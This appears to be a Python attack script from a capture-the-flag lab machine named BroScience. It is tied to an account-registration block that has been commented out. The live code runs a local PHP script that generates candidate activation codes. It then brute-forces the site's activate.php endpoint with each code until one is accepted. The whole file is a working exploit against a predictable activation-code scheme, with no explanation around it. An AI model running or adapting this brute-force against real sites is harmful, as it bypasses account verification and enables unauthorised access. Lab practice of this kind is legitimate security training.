import requests
import subprocess

import random

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""
username = "user" + str(random.randint(0, 1000000000))

data = {
	"username": "miao",
	"email": "miao@miao.com",
	"password": "miao",
	"password-confirm": "miao"
}

r = requests.post("http://broscience.htb/register.php", data=data, verify=False)
print(r.status_code)
"""

# Bruteforce code
proc = subprocess.Popen("php generate_code.php", shell=True, stdout=subprocess.PIPE)
script_response = proc.stdout.read()

# Try generated codes
for code in script_response.splitlines():
	r = requests.get("http://broscience.htb/activate.php", params={"code": code}, verify=False)
	if "Invalid activation code" not in r.text:
		print("[+] Code: " + code.decode("utf-8"))
		break
